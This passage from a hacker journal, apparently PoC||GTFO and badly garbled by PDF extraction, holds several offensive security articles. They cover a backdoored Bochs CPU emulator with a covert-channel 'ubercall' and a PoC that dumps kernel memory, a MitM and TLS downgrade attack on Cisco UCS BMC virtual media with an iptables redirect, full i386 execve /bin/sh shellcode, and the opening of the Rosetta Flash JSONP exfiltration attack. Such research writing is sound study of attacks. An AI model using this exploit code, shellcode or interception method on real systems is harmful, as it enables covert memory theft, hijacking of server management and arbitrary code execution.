op1_64 = BX_READ_64BIT_REG( i −>d s t ( ) ) ;
9
op2_64 = BX_READ_64BIT_REG( i −>s r c ( ) ) ;
sum_64 = op1_64 + op2_64 ;
11
/∗ U b e r c a l l c a l l i n g c o n v e n t i o n :
13
authentication :
RAX = 0 x 9 9 a 0 0 8 6 f b a 2 8 d f d 1
15
RBX = 0 xe2dd84b5c9688a03
17
19
arguments :
RCX = u b e r c a l l number
RDX = argument 1 ( u s u a l l y an a d d r e s s )
RSI = argument 2 ( u s u a l l y a v a l u e )
21
23
25
27
29
31
33
35
t e s t i n g only :
RDI = r e t u r n v a l u e
RBP = e r r o r i n d i c a t o r (1 i f f an e r r o r o c c u r r e d )
^^^^^ t e s t i n g o n l y ^^^^^
u b e r c a l l numbers :
RCX = 0 xabadbabe 00000001 i s PEEK t o a v i r t u a l a d d r e s s
r e t u r n ∗ ( u i n t 8 _ t ∗ ) RDX
RCX = 0 xabadbabe 00000002 i s POKE t o a v i r t u a l a d d r e s s
∗ ( u i n t 8 _ t ∗ ) RDX = RSI
i f t h e page t a b l e w a l k f a i l s , we don ’ t g e n e r a t e any k i n d o f f a u l t or
e x c e p t i o n , we j u s t w r i t e 1 t o t h e e r r o r i n d i c a t o r f i e l d .
t h e page t a b l e t h a t i s used i s t h e one t h a t i s used when t h e c u r r e n t
p r o c e s s a c c e s s e s memory
37
39
41
43
45
47
49
51
RCX = 0 xabadbab e00000003 i s PEEK t o a p h y s i c a l a d d r e s s
r e t u r n ∗ ( u i n t 8 _ t ∗ ) RDX
RCX = 0 xabadbab e00000004 i s POKE t o a p h y s i c a l a d d r e s s
∗ ( u i n t 8 _ t ∗ ) RDX = RSI
( we o n l y r e a d / w r i t e 1 b y t e a t a time b e c a u s e a n y t h i n g e l s e c o u l d
i n v o l v e a l i g n m e n t i s s u e s and/ or a c c e s s t h a t c r o s s page b o u n d a r i e s )
∗/
ctr_output ( keystream ) ;
if (
( (RAX ^ ∗ ( ( u i n t 6 4 _ t ∗ ) k e y s t r e a m ) ) == 0 x 9 9 a 0 0 8 6 f b a 2 8 d f d 1 )
&& ( (RBX ^ ∗ ( ( u i n t 6 4 _ t ∗ ) k e y s t r e a m + 1 ) ) == 0 xe2dd84b5c9688a03 ) ) {
// we have a v a l i d u b e r c a l l , l e t ’ s do t h i s t e x a s −s t y l e
p r i n t f ( "COUNTER = %016lX \n" , BX_CPU_THIS_PTR e v i l . i _ c o u n t e r ) ;
29p r i n t f ( " e n t e r e d u b e r c a l l ! RAX = %016lX RBX = %016lX RCX = %016lX RDX = %016lX \n" ,
RAX, RBX, RCX, RDX) ;
BX_CPU_THIS_PTR e v i l . i _ c o u n t e r ++;
ctr_output ( keystream ) ;
BX_CPU_THIS_PTR e v i l . i _ c o u n t e r ++;
53
55
57
switch (RCX ^ ∗ ( ( u i n t 6 4 _ t ∗ ) k e y s t r e a m ) ) {
case 0 xabadbabe00000001 : // peek , v i r t u a l
a c c e s s _ r e a d _ l i n e a r _ n o f a i l (RDX ^ ∗ ( ( u i n t 6 4 _ t ∗ ) k e y s t r e a m + 1 ) ,
1 , 0 , BX_READ, ( void ∗ ) &data , &e r r o r ) ;
BX_CPU_THIS_PTR e v i l . e v i l b y t e = data ;
BX_CPU_THIS_PTR e v i l . e v i l s t a t u s = e r r o r ;
break ;
}
BX_CPU_THIS_PTR e v i l . o u t _ s t a t = 0 ; /∗ we s t a r t a t t h e h i h a l f o f t h e
o u t p u t b l o c k now ∗/
59
61
63
65
67
}
69
BX_WRITE_64BIT_REG( i −>d s t ( ) , sum_64 ) ;
71
SET_FLAGS_OSZAPC_ADD_64( op1_64 , op2_64 , sum_64 ) ;
73
BX_NEXT_INSTR( i ) ;
75 }
77 void BX_CPU_C : : c t r _ o u t p u t ( u i n t 8 _ t ∗ out ) {
uint8_t i b u f [ 1 6 ] ;
79
AES_KEY k e y c t x ;
81
AES_set_encrypt_key (BX_CPU_THIS_PTR e v i l . aes_key , 1 2 8 , &k e y c t x ) ;
83
memset ( i b u f , 0 x e f , 1 6 ) ;
memcpy ( i b u f , &(BX_CPU_THIS_PTR e v i l . i _ c o u n t e r ) , 8 ) ;
AES_encrypt ( i b u f , out , &k e y c t x ) ;
85
}
8.3
Fun things to do in Ring -4
Now that we have ways to get data in and out of the ubervisor, we need to consider what exactly can be
done within the ubervisor. In the general case, we create a bit of memory space and register space for our
ubervisor and have ubercalls that allow reading and writing from the ubervisor’s memory space as well as
starting and stopping the ubervisor execution to load and execute arbitrary code isolated from the x86 core.
For sake of simplicity, I just implemented one ubercall which reads a byte from the specified virtual
address and returns it via the RDRAND covert channel. This is done by ignoring all memory protection
mechanisms. I needed to make copies of all the functions involved in converting a long mode virtual address
into a physical address and strip out any code that changes the state of the CPU, including anything which
adds entries to the TLB or causes exceptions or faults.
This is what the function called access_read_linear_nofail does.
2
/∗ i m p l e m e n t a t i o n s o f b y t e −at−a−time v i r t u a l r e a d / w r i t e s f o r l o n g mode t h a t
n e v e r c a u s e f a u l t s / e x c e p t i o n s and maybe do n o t a f f e c t TLB c o n t e n t ∗/
4 #define NEED_CPU_REG_SHORTCUTS 1
#include " bochs . h"
6 #include " cpu . h"
#define LOG_THIS BX_CPU_THIS_PTR
8 #define BX_CR3_PAGING_MASK
(BX_CONST64( 0 x 0 0 0 f f f f f f f f f f 0 0 0 ) )
#define PAGE_DIRECTORY_NX_BIT (BX_CONST64( 0 x8000000000000000 ) )
10 #define BX_PAGING_PHY_ADDRESS_RESERVED_BITS \
3012 #define
#define
14 #define
#define
16 #define
(BX_PHY_ADDRESS_RESERVED_BITS & BX_CONST64( 0 x f f f f f f f f f f f f f ) )
PAGING_PAE_RESERVED_BITS (BX_PAGING_PHY_ADDRESS_RESERVED_BITS)
BX_LEVEL_PML4 3
BX_LEVEL_PDPTE 2
BX_LEVEL_PDE
1
BX_LEVEL_PTE
0
18 // k e e p i t 4 l e t t e r s
s t a t i c const char ∗ b x_ pa g in g_ l ev el [ 4 ] = { "PTE" , "PDE" , "PDPE" , "PML4" } ;
20
B i t 8 u BX_CPP_AttrRegparmN ( 2 )
22 BX_CPU_C : : r e a d _ v i r t u a l _ b y t e _ 6 4 _ n o f a i l ( unsigned s , B i t 6 4 u o f f s e t , u i n t 8 _ t ∗ e r r o r )
{
24
B i t 8 u data ;
B i t 6 4 u l a d d r = g e t _ l a d d r 6 4 ( s , o f f s e t ) ; // t h i s i s s a f e
26
i f ( ! IsCanonical ( laddr ) ) {
28
∗ error = 1;
return 0 ;
30
}
32
a c c e s s _ r e a d _ l i n e a r _ n o f a i l ( l a d d r , 1 , 0 , BX_READ, ( void ∗ ) &data , e r r o r ) ;
return data ;
34 }
36 i n t BX_CPU_C : : a c c e s s _ r e a d _ l i n e a r _ n o f a i l ( bx_address l a d d r , unsigned l e n ,
unsigned curr_pl , unsigned xlate_rw ,
38
void ∗ data , u i n t 8 _ t ∗ e r r o r )
{
40
B i t 3 2 u combined_access = 0 x06 ;
B i t 3 2 u lpf_mask = 0 x f f f ; // 4K p a g e s
42
bx_phy_address p a d d r e s s , ppf , p o f f s e t = PAGE_OFFSET( l a d d r ) ;
44
46
48
paddress = translate_linear_long_mode_nofail ( laddr , e r r o r ) ;
p a d d r e s s = A20ADDR( p a d d r e s s ) ;
i f ( ∗ e r r o r == 1 ) {
return 0 ;
}
a c c e s s _ r e a d _ p h y s i c a l ( p a d d r e s s , l e n , data ) ;
50
return 0 ;
52 }
54
bx_phy_address BX_CPU_C : : t r a n s l a t e _ l i n e a r _ l o n g _ m o d e _ n o f a i l ( bx_address l a d d r , u i n t 8 _ t ∗ e r r o r )
56 {
bx_phy_address entry_addr [ 4 ] ;
58
bx_phy_address p p f = BX_CPU_THIS_PTR c r 3 & BX_CR3_PAGING_MASK;
Bit64u entry [ 4 ] ;
60
bx_bool n x _ f a u l t = 0 ;
int l e a f ;
62
B i t 6 4 u o f f s e t _ m a s k = BX_CONST64( 0 x 0 0 0 0 f f f f f f f f f f f f ) ;
64
B i t 6 4 u r e s e r v e d = PAGING_PAE_RESERVED_BITS;
66
i f ( ! BX_CPU_THIS_PTR e f e r . get_NXE ( ) )
r e s e r v e d |= PAGE_DIRECTORY_NX_BIT;
68
f o r ( l e a f = BX_LEVEL_PML4 ; ; −− l e a f ) {
70
entry_addr [ l e a f ] = p p f + ( ( l a d d r >> ( 9 + 9∗ l e a f ) ) & 0 x f f 8 ) ;
72
74
a c c e s s _ r e a d _ p h y s i c a l ( entry_addr [ l e a f ] , 8 , &e n t r y [ l e a f ] ) ;
BX_NOTIFY_PHY_MEMORY_ACCESS( entry_addr [ l e a f ] , 8 , BX_READ, (BX_PTE_ACCESS + l e a f ) ,
( B i t 8 u ∗ ) (& e n t r y [ l e a f ] ) ) ;
o f f s e t _ m a s k >>= 9 ;
3176
Bit64u curr_entry = entry [ l e a f ] ;
i n t f a u l t = check_entry_PAE ( bx _ pa g in g_ le v el [ l e a f ] , c u r r _ e n t r y ,
r e s e r v e d , 0 , &n x _ f a u l t ) ;
i f ( f a u l t >= 0 ) {
∗ error = 1;
return 0 ;
}
78
80
82
84
p p f = c u r r _ e n t r y & BX_CONST64( 0 x 0 0 0 f f f f f f f f f f 0 0 0 ) ;
86
i f ( l e a f == BX_LEVEL_PTE) break ;
88
i f ( c u r r _ e n t r y & 0 x80 ) {
i f ( l e a f > (BX_LEVEL_PDE + ! ! bx_cpuid_support_1g_paging ( ) ) ) {
BX_DEBUG( ( "PAE %s : PS b i t s e t ! " , bx _p a gi ng _ le ve l [ l e a f ] ) ) ;
∗ error = 1;
return 0 ;
}
90
92
94
96
p p f &= BX_CONST64( 0 x 0 0 0 f f f f f f f f f e 0 0 0 ) ;
i f ( ppf & offset_mask ) {
BX_DEBUG( ( "PAE %s : r e s e r v e d b i t i s s e t : 0x" FMT_ADDRX64,
b x_ pa g in g_ l ev el [ l e a f ] , c u r r _ e n t r y ) ) ;
∗ error = 1;
return 0 ;
}
98
100
102
104
break ;
}
} /∗ f o r ( l e a f = BX_LEVEL_PML4 ; ; −− l e a f ) ∗/
106
108
∗ error = 0;
return p p f | ( l a d d r & o f f s e t _ m a s k ) ;
110
}
Please note that the above code chokes if reading more than one byte, because for simplicity, I have
removed all code that deals with alignment issues and reads that span multiple pages.
If we were making an actual CPU with this backdoor mechanism, we would be more devious: instead
of commanding a read when we make the ubercall, we would wait until the requested memory address is
read by a legitimate process. This is so that the operation is not observable by looking at the activity on
the wiring between the CPU and memory. That way, no software or hardware observation can reveal the
presence of this type of backdoor besides analyzing the CPU die itself.
Note that anything that the CPU can access has to be accessible by this type of backdoor. There is no
way to hide your information from this backdoor and still be able to process it with your CPU.
8.4
A PoC to dump kernel memory.
Once we have patched Bochs, we can start up Linux and run the following code to dump an arbitrary range
of virtual memory:
1 #include
#include
3 #include
#include
5 #include
<o p e n s s l / a e s . h>
< s t d l i b . h>
< s t r i n g . h>
<s t d i n t . h>
<s t d i o . h>
7 struct c t r c t x {
uint64_t counter ;
329
uint8_t aeskey [ 1 6 ] ;
};
11
void poke ( ) {
v o l at i l e uint64_t c , d ;
c = 0 xaaabadbadbadbeef ;
15
d = 0 xbeefbeefbeefbeef ;
asm v o l a t i l e ( " rdran d %0\n\ t "
17
" rdran d %1" : "=r " ( c ) , "=r " ( d ) ) ;
p r i n t f ( "%016lX " , c ) ;
19
p r i n t f ( "%016lX \n" , d ) ;
}
21
i n t main ( ) {
23
v o l at i l e uint64_t rax ;
v o l a t i l e u i n t 6 4 _ t rbx ;
25
v o l at i l e uint64_t rcx ;
v o l a t i l e u i n t 6 4 _ t rdx ;
27
u i n t 6 4 _ t base , l e n , i ;
13
29
struct c t r c t x c t x ;
uint8_t buf [ 1 6 ] ;
31
base = 0 x f f f f f f f f 8 1 0 5 c 7 e 0 ;
len = 1024;
ctx . counter = 0;
memcpy ( c t x . a e s k e y , "YELLOW SUBMARINE" , 1 6 ) ;
33
35
37
f o r ( i = b a s e ; i < b a s e + l e n ; i ++) {
c t r _ o u t p u t ( buf , &c t x ) ;
39
rax
rbx
rcx
rdx
41
43
=
=
=
=
0 x99a0086fba28dfd1 ;
0 xe2dd84b5c9688a03 ;
0 xabadbabe00000001 ;
i;
r a x ^= ∗ ( ( u i n t 6 4 _ t ∗ ) b u f ) ;
rbx ^= ∗ ( ( u i n t 6 4 _ t ∗ ) b u f + 1 ) ;
c t x . c o u n t e r ++;
c t r _ o u t p u t ( buf , &c t x ) ;
r c x ^= ∗ ( ( u i n t 6 4 _ t ∗ ) b u f ) ;
rdx ^= ∗ ( ( u i n t 6 4 _ t ∗ ) b u f + 1 ) ;
c t x . c o u n t e r ++;
45
47
49
51
53
asm v o l a t i l e (
" add %0, %1" : "=a " ( r a x ) : " a " ( r a x ) , "b" ( rbx ) , " c " ( r c x ) , "d" ( rdx ) : ) ;
55
poke ( ) ;
57
}
}
59
61
void c t r _ o u t p u t ( u i n t 8 _ t ∗ output , struct c t r c t x ∗ c t x ) {
uint8_t i b u f [ 1 6 ] ;
63
AES_KEY k e y c t x ;
AES_set_encrypt_key ( ctx−>a e s k e y , 1 2 8 , &k e y c t x ) ;
65
67
memset ( i b u f , 0 x e f , 1 6 ) ;
memcpy ( i b u f , &( ctx−>c o u n t e r ) , 8 ) ;
AES_encrypt ( i b u f , output , &k e y c t x ) ;
69 }
33In the above code, an output in peek_output will generate a memory dump. Look at the last byte in
each 16 byte block for the bytes of data. 12
for foo in ‘cat peek_output‘; do echo -n $foo |xxd -r -p | ./qw |
openssl enc -d -aes-128-ecb -nopad -K 59454c4c4f57205355424d4152494e45|xxd >> dump;done}
Here are the first few lines of a dump, beginning at 0xffffffff8105c7e0.
1 0000000:
0000000:
3 0000000:
0000000:
5 0000000:
0000000:
7 0000000:
0000000:
9 0000000:
0000000:
11 0 0 0 0 0 0 0 :
0000000:
13 0 0 0 0 0 0 0 :
0000000:
15 0 0 0 0 0 0 0 :
0000000:
db10
dc10
dd10
de10
df10
e010
e110
e210
e310
e410
e510
e610
e710
e810
e910
ea10
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
0000
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
fefe
00 c0
00 be
009 f
0000
0000
0000
0048
00 c7
00 c7
00 d8
002 f
006 f
0081
00 e8
000 e
00 bd
................
................
................
................
................
................
. . . . . . . . . . . . . . .H
................
................
................
.............../
...............o
................
................
................
................
Look at the first few bytes starting at 0xffffffff8105c7e0, which is in the text section of the kernel.
Run ./extract-vmlinux on the vmlinuz file and objdump -d to extract the code.
If you compare the first few bytes of the dump above with the output of objdump, you will find a match!
ffffffff8105c7df
2 ffffffff8105c7e1
ffffffff8105c7e6
4 ffffffff8105c7ed
:
:
:
:
75
be
48
e8
c0
9 f 00 00 00
c7 c7 d8 2 f 6 f 81
0 e bd f f f f
Note that throughout the execution of this program, all the deterministic register/memory state is iden-
tical whether or not you run it on a CPU that has this backdoor. Full code is available by unzipping this
PDF file. 13
12 The ./qw directive simply swaps endianess on all bytes in each quadword because of how we copied data from the output
buffer for AES into the registers.
13 git clone https://github.com/matildah/bochsdoor
349
From Protocol to PoC; or,
Your Cisco blade is booting PoCkGTFO.
by Mik
We often see products with network protocols intended to be opaque to us. We suspect that we can do
interesting things with it, but where do we start?
This article will guide you from an opaque protocol used by Cisco UCS and some Dell servers for KVM
and remote virtual media block device functionality, to a PoC that takes advantage of this protocol’s bolt-on
security. This protocol has been the subject of Bug IDs CSCtr72949 and CSCtr72964, better knows as
CVE-2012-4114 and CVE-2012-4115. But then, who among you, when your son hungers for a PoC, would
give him a CVE? 14
So we will walk the road to PoC together, working up to a way to replace the CD/DVD that the
administrator is exporting with a more fun virtual ISO image, then take the further step of redirecting the
inserted USB key via a more open protocol.
While data centers are near-optimal habitats for computers, spending long hours and late nights there
can be quite uncomfortable for humans. To alleviate this problem, most server systems incorporate a BMC
management console that provides remote keyboard, mouse, video and virtual media—generally emulating
a USB keyboard, mouse, DVD-ROM and removable disk, while also intercepting video output.
My journey down this road started when a prompt from my Cisco blade popped up. It turned out that
while keyboard and mouse sessions could do TLS, the video or virtual media interfaces could not. This told
me not only that the most dangerous interface to my systems was insecure, but also the TLS support was
bolted-on and thus it wasn’t hard to trick a user who didn’t read the prompt text carefully.
While much fun could be had intercepting the keyboard and video streams, the importance of securing
block device access seemed to be overlooked by those filling in the CVSS score form, so I took it upon myself
to prepare a demonstration.
In order to do this, we need to understand the protocol, so let us link arms and take a stroll down PoC
lane.
9.1
Framing
Distinguishing the individual frames is an excellent starting point for unraveling an otherwise unknown
protocol. Generally speaking, a protocol will send messages in one of the following formats:
Explicit length: Just put the message length at or near the start of the message. Sometimes it’s the
payload length, other times it includes the length field itself.
Examples of this are the DIAMETER protocol, TLS, and indeed the APCP/AVMP protocols described
here.
14 Matthew
7:9
35Defer to upper-layer: This is common with UDP-based protocols—simply allow the upper layer to define
the frame boundary. It would be foolhardy for a protocol designer to rely on frame boundaries with TCP.
Often the sending side will send a complete frame in a segment, offering a vital hint to the reverse engineer.
Delimiter: Classic examples of this are line-oriented protocols such as POP3 and SMTP where the de-
limiter is CRLF. Other protocols, those originally designed to operate over bitstream transports, refer to
their delimiter as “sync bits”. The general rule is that the message starts or stops at an easily recognized
boundary, and also that they do their damndest to avoid placing the delimiter in the message itself.
Dual-Mode: Even seasoned vi users occasionally type code while in command mode or find a rogue
ex command in a config file. The same can be said for network protocols. HTTP uses CRLF-CRLF as a
delimiter to denote the end of the headers, then once the Content-Length header has been parsed the message
body length is known. This state transition makes for some awful, buggy implementations, a situation that
didn’t improve with Chunked encoding.
In our case, the TCP session looks a little something like this.
This is extremely lucky, as it seems the application developer accidentally wrote the packet header byte
at a time, each having its own segment. This makes it easy to distinguish the header from the body.
As we can see, there’s a magic field, “APCP”, then a big-endian number that happens to match the frame
size including the header, then four bytes.
The catch is that there are actually three protocols running on this port: APCP, BEEF, and AVMP, and
their respective framing is subtly different.
APCP functions as a control protocol, so we need to decode those frames, even though we’re not partic-
ularly interested in them.
BEEF is the protocol that the keyboard, video and mouse operate on. We switch to pass-through mode
when we see a BEEF packet, or indeed anything we don’t recognize, in order to allow it to pass unhindered.
AVMP is the virtual media protocol, which only starts when you click on the virtual media tab. The
term “virtual media” may be more familiar if you rephrased it as “remote DVD-ROM and removable disk.”
9.2
Message Types
Binary protocols like these generally require that the type of message be in the message header. This is
analogous to the request line in HTTP, in that it allows the remote end to route the message to the correct
processing routine.
36Often enabling logging on the application will simply name the decoded message type for you. 15 There’s
no need to over-extend yourself decoding particular message types if they don’t seem relevant to your PoC,
but you should at least note the name and function of messages if you can infer them.
In this case we are dealing with block devices. Block device protocols only have two methods of interest.
read(offset, length) -> data[length] | error
write(offset, data[length]) -> ack | error
Offset and length are either multiplied by the block size or aligned to the block size. Block devices don’t
let you write half-blocks—when you write less than a full block to the middle of a file, your filesystem needs
to read in the block and write back the modified version.
The read response and write request were easy to spot—simply transfer some data and you’ll see it in the
frame. The server will send a maximum of sixteen blocks per read response, but will respond in full using
multiple messages then send a “Status” message with a code of zero. Error messages are simply “Status”
messages with a non-zero code.
Note that in the case of AVMP and NBD (and indeed modern SCSI and ATA protocols) requests are
tagged. Each tag is an opaque value on the request, which must be returned with the response. This allows
multiple messages to be in-flight at once, which greatly increases the throughput.
Read requests in AVMP also have a third argument, referred to as the Block Factor, which is the maximum
number of blocks the application should send back in a single read response. I did not try sending more,
mostly because I wished to avoid an unpleasant trip to the data center.
There were other AVMP requests that I had to find and decode. These were the ones that described the
drive, and mapped and unmapped a drive (read: inserted or removed a disk).
9.3
TLS
In this age of mistrust, customers are demanding encryption for all of their network protocols. TLS is the
standard answer; while it isn’t much fun to circumvent TLS, it’s generally not much trouble.
If the program talks some cleartext protocol before sending a TLS ClientHello, chances are that it is
negotiating whether or not to enable TLS over the network. This is, of course, ridiculous, but alas it’s a
popular idiom for bolted-on cryptography. 16
In these circumstances, the prudent thing to do would be to tell the client that the server doesn’t know
what TLS is. My PoC does this with the --downgrade option.
The server often enforces that only TLS connections should be allowed, but since the client is rarely
authenticated at the TLS layer, your exploit tool may simply establish a TLS connection to the server while
maintaining a cleartext connection to the client.
The effects of connection downgrade are rather subtle. While the connection is now operating in malleable
cleartext, the prompt dialog changes only slightly:
15 “Trace
16 Try
logging” in Java.
this with your favorite SMTP, XMPP and IMAP clients—you may be unpleasantly surprised.
37It should be noted that with the virtual media component on the Cisco blades it actually sends the
cleartext password in the background before you mindlessly click “Accept”. 17
If the client seems to only wish to talk TLS, an alternative approach may be used. You simply start
up a TLS server and accept the client connection. You may then establish a TLS client connection to the
server, and forward the data between them. This is commonly called a Man-in-The-Middle attack, but in
this modern age it’s generally machines rather than men or women who perform such work.
Astute readers will note that this will annoy the certificate validation routine in the client application.
In reality, this is rarely the case. 18 If such a validation routine even exists, it can be bypassed with an
Accept/Reject dialog which displays some textual information that you can easily duplicate in your own
self-signed certificate.
For a particularly ironic example of this, look at the code in the supplied PoC. The two useful options
work together with some way of passing the IP traffic to the Machine-in-the-Middle, which runs the client.
--servercert SERVERCERT
File containing the server certificate for MitM
--serverkey SERVERKEY
File containing the server private key for MitM
Your friendly neighborhood iptables can take care of the redirection.
iptables -A PREROUTING -d [target IP] -p tcp --dport 2068 -j REDIRECT --to-ports 2068
9.4
Clients and Servers
It is interesting to note that in SCSI there are no clients and servers. Instead, there are Initiators and
Targets. This applies to many protocols which two distinct roles, both providing services to each other. The
classic example is that a web browser provides more valuable information to the web server than vice versa,
yet the reason it’s considered the client is that it initiates the connection.
When intercepting network connections, you should consider what services both ends of the connection
provide you.
In our example, which intercepts Virtual Media connections between a Java application and BMC, the
BMC provides the service of connecting CD-ROMs and removable media to it. While generally this involves
17 This is still an improvement over other vendors, which do not display any prompt and simply talk in the clear. At least
one has devoted man-hours to fixing this since trying out my PoC.
18 If you don’t believe us, neighbor, there’s an academic paper about that, “The most dangerous code in the world: validating
SSL certificates in non-browser software”, by Georgiev et al. —PML
38a server administrator wasting hours waiting for an operating system to install, we might choose something
more fun, such as tetranglix from PoCkGTFO 3:8.
The --cdrom CDROM option in the PoC replaces any mapped CD-ROM with the provided image file.
The service provided by the application is possibly more interesting. A server administrator might
connect a USB key to the system, perhaps containing a “kickstart” or “sysprep” file. The provided PoC will
export the inserted Removable Media via NBD, which most Linux systems will happily mount as if it were
a normal hard drive. This feature can be accessed with --ndb and --ndblisten address:port. Please be
kind when testing, as this is exported read/write.
9.5
Have fun, stay safe
If you own a system that contains a BMC, please be careful what networks you connect it to, and which
networks you access it through. A simple solution might be to connect a VPN device directly to it, and run
a VPN client application on your desktop.
Remember that besides bolt-on security, such systems’ management interfaces likely have plenty of other
flaws. For example, see the SSH banner that the same BMC produces, or IPMI Cipher 0.
3910
i386 Shellcode for Lazy Neighbors; or,
I am my own NOP Sled.
by Brainsmoke
Who needs a NOP sled when you can jump into the middle of your shellcode and still succeed? The trick
here is to set a canary value at the start of the shellcode and check it at the very end. This allows for an
exploit to jump right in the middle of the shellcode, because when the canary check fails, the shellcode will
just start again from the beginning.
Due to placement of variables in memory by the compiler it is usually possible to guess a payload’s
four-byte alignment. Let’s assume a possible entry point at every fourth byte, not bothering with any other
offsets as doing this for every single offset would be impossible. 19
In order to make this work, no entry point should generate a fault, regardless of the register values. This
means we will only be accessing memory through the stack pointer. We also shy away from instructions
that are larger than four bytes, such as the five byte long 32 bit push-immediate instruction. Instead, we
use smaller instructions to achieve the same goal. In this case we use the four byte long 16 bit push. This
means that we, for the greater part of the shellcode, do not have to worry about jumping in to the middle
of instructions.
For our canary check, at the start of the shellcode we will fill ebp with the 32 most significant bits of
the timestamp counter. On modern CPUs this value increases every few seconds. As ebp often contains
a pointer to an address on the stack, it is unlikely that it will have the same value initially. Just before
popping shell, we will read the timestamp counter again and compare. If they differ, we’ll assume we entered
somewhere in the middle of the code and restart from the beginning. As this value changes every once in a
while, you might be so unlucky that it changed in the few cycles between the two reads, but in this case our
shellcode will just loop one extra time before finishing.
“But,” I hear you say, “what if we jump into the middle of the canary check?” Our canary check, together
with the conditional jump to the beginning, and the final syscall instruction cannot possibly fit in four bytes.
This is where we make use of unaligned instructions. For the canary check, we use code that does not have
instructions that start at a four-byte boundary. At the same time, we make sure that the first two bytes at
fourth byte boundary will be 0xeb 0xf2 which, when executed as an instruction will jump 14 bytes back
into the shellcode. This will land it again on a four-byte boundary. Eventually the program counter will
land into an earlier part of the shellcode that is in the right instruction chain.
Assuming our shellcode eventually calls int 80h, which is 0xcd 0x80, the final part of our shellcode now
looks a little like the following.
last normal four-byte aligned instruction
/
|
__________________________ 4 byte aligned _________________________
|
/
|
|
|
|
\
V .. .. .. .. | eb f2 .. .. | eb f2 .. .. | eb f2 .. .. | eb f2 .. .. | eb f2 cd 80
> jmp back
> jmp back
> jmp back
> jmp back
> jmp back
In our normal instruction thread, bytes 0xeb shall become the last byte of an instruction, and the 0xf2
bytes will become the first byte of the next opcode. Fortunately 0xf2 is a prefix code which can be prepended
to many short instructions without any harmful side-effects.
As you can see there’s not much room left for our own instructions. Certainly since every fourth byte
will need to be part of a multi-byte opcode together with 0xeb. To address this, we will need to find some
useful instructions that contain 0xeb.
When 0xeb is used as the second byte of a compare operation (opcode 0x39), it represents the ebp, ebx
register pair. We will be using this both as a nop as well as for our canary comparison. Another option is
19 If
you can prove me wrong, I’d love to see the PoC.
40to use 0xeb as the second byte of a conditional jump which, if taken will land you somewhere earlier in the
shellcode, on a four-byte boundary.
Combining those two instruction gives us the building blocks for our canary check: compare two values
and jump backward if they do not match. Now all we have to do is load the high 32 bits of the timestamp
counter in ebx and restore any spilled registers before calling int 80h. The ebp register already has the
right value.
0000 :
2 0002 :
0003 :
4 0004 :
0006 :
6 0008 :
000C :
8 0010 :
0014 :
10 0018 :
001C :
12 0020 :
0024 :
14 0028 :
002C :
16 0030 :
0032 :
18 0034 :
0038 :
20 003C :
0040 :
22 0042 :
0044 :
24 0046 :
0048 :
26 004C :
004D :
28 004F :
0050 :
30 0051 :
0052 :
32 0054 :
0056 :
34 0058 :
005A :
36 005B :
005C :
38 0060 :
0064 :
40 0068 :
006C :
42 0070 :
0f
92
95
31
66
66
66
66
66
66
66
66
66
66
66
89
6a
66
66
66
89
6a
b2
89
88
53
89
51
56
50
eb
eb
89
b3
50
52
0f
eb
eb
eb
eb
31
db
53
68
68
68
68
68
68
68
68
68
68
e1
68
68
68
68
e0
2d
63
e6
54
75
62
67
65
20
6c
65
20
68
65
2 f 73
69 6e
2 f 62
24 01
e2
02
aa
e1
0b
31
f2
f2
f2
f2
92
93
5a
5b
cd
44
005C :
46 005E :
005F :
48 0061 :
0063 :
50 0065 :
0067 :
52
0069 :
54 006B :
006D :
0f
92
39
f2
39
f2
75
72
6f
68
69
4e
6f
6c
48
6f
63
31
eb
93
eb
5a
eb
f 2 5b
39 eb
f 2 cd 80
39
39
75
39
80
rdtsc
; r e a d timestamp c o u n t e r
xchg edx , eax
xchg ebp , eax
; p u t h i g h dword i n ebp
xor ebx , ebx
push bx
push small 07275h
push small 06F62h
push small 06867h
push small 06965h
push small 04E20h
push small 06F6Ch
push small 06C65h
push small 04820h
push small 06F68h
push small 06365h
mov ecx , esp
; a r g v [ 2 ] −> e c x
push 068h
push small 0732Fh
push small 06E69h
push small 0622Fh
mov eax , esp
; f i l e n a m e / a r g v [ 0 ] −> eax
push 02Dh
mov dl , 063h
mov e s i , esp
; a r g v [ 1 ] −> e s i
mov [ esp+1h ] , dl
push ebx
mov edx , esp
; envp [ NULL ] −> edx
push ecx
push e s i
push eax
jmp short 0056h
jmp short 0000h
; jump b a c k ’ midway s t a t i o n ’
mov ecx , esp
; a r g v [ ’/ b i n / sh ’ , . . . ] −> e c x
mov bl , 0Bh
; __NR_EXECVE −> e b x
push eax
; push f i l e n a m e
push edx
; push envp
−−−−−−−−−−−−−−−−−−−−−−−.
jmp short 0054h ; . . .
| t h e s e jumps w i l l a l l
jmp short 0058h ; . . .
| ( e v e n t u a l l y ) end up
jmp short 005Ch ; . . .
| a t 005C
jmp short 0060h ; . . .
|
.______________________/
|
V
rdtsc
xchg edx , eax
; canary v a l −> eax
cmp ebx , ebp
; no−op
repnz xchg ebx , eax
; canary v a l −> e b x / __NR_EXECVE −> eax
cmp ebx , ebp
; canary c h e c k −> OK i f z e r o
repnz pop edx
; envp −> edx
jnz 0054h
; jump t o ’ midway s t a t i o n ’ i n c a s e
; the check f a i l s
repnz pop ebx
; f i l e n a m e −> e b x
cmp ebx , ebp
; nop
repnz i n t 80h
; we ’ r e done : −)
4111
Abusing JSONP with Rosetta Flash
by Michele Spagnuolo,
whose opinions are not endorsed by his employer.
In this article I present Rosetta Flash, a tool for converting any SWF file to one composed of only
alphanumeric characters, in order to abuse JSONP endpoints. This PoC makes a victim perform arbitrary
requests to the vulnerable domain and exfiltrate potentially sensitive data, not limited to JSONP responses,
to an attacker-controlled site. This vulnerability got assigned CVE-2014-4671.
Rosetta Flash leverages zlib, Huffman encoding, and Adler-32 checksum brute-forcing to convert any
SWF file to another one composed of only alphanumeric characters, so that it can be passed as a JSONP
callback and then reflected by the endpoint, effectively hosting the Flash file on the vulnerable domain.
11.1
The Attack Scenario
